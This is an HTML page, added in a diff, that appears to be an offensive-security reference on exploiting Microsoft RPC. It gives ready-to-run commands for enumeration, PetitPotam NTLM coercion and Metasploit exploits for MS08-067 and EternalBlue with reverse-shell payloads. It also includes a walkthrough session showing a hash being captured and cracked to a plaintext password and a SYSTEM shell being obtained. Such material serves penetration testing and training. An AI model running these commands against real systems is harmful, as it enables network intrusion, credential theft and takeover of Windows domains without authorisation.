@@ -1,0 +1,191 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">MS-RPC Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Windows Network Security</strong> • Focus: <strong>MS-RPC Abuse & Vulnerabilities</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Microsoft RPC (Remote Procedure Call) is a core Windows protocol that enables 
+    services and applications to communicate across a network. Exposed over TCP/135 
+    with dynamic port allocation, MS-RPC is abused for lateral movement, authentication 
+    relay, and even remote code execution. Notable attacks include MS08-067 (Conficker), 
+    EfsRpc coercion (PetitPotam), and printer spooler abuse. Attackers leverage MS-RPC 
+    for enumeration, coercion of NTLM authentication, and exploitation of unpatched 
+    vulnerabilities in enterprise networks.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Wide Attack Surface:</strong> RPC underpins SMB, AD, DCOM, and many services.</li>
+    <li><strong>Dynamic Ports:</strong> Difficult to firewall without breaking functionality.</li>
+    <li><strong>Legacy Vulnerabilities:</strong> MS08-067, MS17-010, and others exploited worms.</li>
+    <li><strong>Authentication Coercion:</strong> EfsRpc & PetitPotam force systems to leak NTLM hashes.</li>
+    <li><strong>Weak Monitoring:</strong> RPC activity often goes unnoticed in enterprise environments.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify open TCP/135 and dynamic RPC ports.</li>
+    <li><strong>Enumeration:</strong> Use rpcdump/rpcclient to list available endpoints and services.</li>
+    <li><strong>Authentication Coercion:</strong> Abuse RPC interfaces like EfsRpc to trigger NTLM authentication.</li>
+    <li><strong>Exploitation:</strong> Exploit unpatched RPC services for RCE (e.g., MS08-067, EternalBlue).</li>
+    <li><strong>Impact:</strong> Lateral movement, credential theft, domain compromise.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for MS-RPC on TCP/135 and dynamic ports.</li>
+    <li>Enumerate endpoints, bindings, and services.</li>
+    <li>Test coercion techniques (PetitPotam, EfsRpc, printer spooler).</li>
+    <li>Exploit vulnerable RPC services (MS08-067, MS17-010, etc.).</li>
+    <li>Leverage compromised RPC for persistence or lateral movement.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p 135,445,593 --script msrpc-enum [target]     # Detect MS-RPC services
+rpcdump.py [target]                                  # List RPC endpoints
+rpcclient -U "" [target]                             # Null session enumeration
+
+# ------------------------------
+# PetitPotam (NTLM Relay via EfsRpc)
+# ------------------------------
+python3 petitpotam.py -d corp.local -u jdoe -p Pass123 192.168.1.50 192.168.1.100
+# Forces target to authenticate to attacker-controlled system
+
+# ------------------------------
+# MS08-067 Exploit
+# ------------------------------
+msfconsole
+use exploit/windows/smb/ms08_067_netapi
+set RHOSTS [target]
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+# ------------------------------
+# MS17-010 (EternalBlue) via RPC
+# ------------------------------
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS [target]
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p 135 192.168.1.50 --script msrpc-enum
+rpcdump.py 192.168.1.50
+python3 petitpotam.py 192.168.1.50 192.168.1.60
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p 135,445 192.168.1.50 --script msrpc-enum
+PORT    STATE SERVICE
+135/tcp open  msrpc
+445/tcp open  microsoft-ds
+| msrpc-enum:
+|   UUID: 12345778-1234-ABCD-EF00-0123456789AB
+|_  Endpoint: ncacn_ip_tcp:192.168.1.50[49667]
+
+[ saide ~ ]$ rpcdump.py 192.168.1.50
+[*] Found 5 endpoints
+UUID: 6BFFD098-A112-3610-9833-46C3F87E345A v1.0
+  Endpoint: ncacn_ip_tcp:192.168.1.50[49670]
+
+[ saide ~ ]$ python3 petitpotam.py 192.168.1.50 192.168.1.100
+[*] Target is coercing authentication to attacker SMB share: 192.168.1.100
+[*] Captured NTLMv2 hash: jdoe::corp.local:aad3b435b51404eeaad3b435b51404ee:32ed8a...
+
+[ saide ~ ]$ hashcat -m 5600 hash.txt rockyou.txt
+jdoe:Spring2025!
+
+[ saide ~ ]$ msfconsole
+msf6 > use exploit/windows/smb/ms08_067_netapi
+msf6 exploit(ms08_067_netapi) > set RHOSTS 192.168.1.50
+msf6 exploit(ms08_067_netapi) > run
+[*] Meterpreter session 1 opened on 192.168.1.50:4444
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample MS-RPC exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# RPC Enumeration
+UUID: 12345778-1234-ABCD-EF00-0123456789AB
+Endpoint: ncacn_ip_tcp:192.168.1.50[49667]
+
+# PetitPotam Authentication Coercion
+Captured NTLMv2 hash: jdoe::corp.local:32ed8a...
+Cracked: jdoe:Spring2025!
+
+# MS08-067 Exploit
+Meterpreter session opened
+Privilege: NT AUTHORITY\SYSTEM
+
+# Proof
+whoami
+nt authority\system
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/windows-hardening/msrpc" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – MSRPC Pentesting
+      </a>
+    </li>
+    <li>
+      <a href="https://github.com/topotam/PetitPotam" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        PetitPotam – NTLM Relay Coercion
+      </a>
+    </li>
+    <li>Classic Red Team path: RPC enumeration → NTLM coercion → hash cracking → RCE exploit.</li>
+  </ul>
+</section>
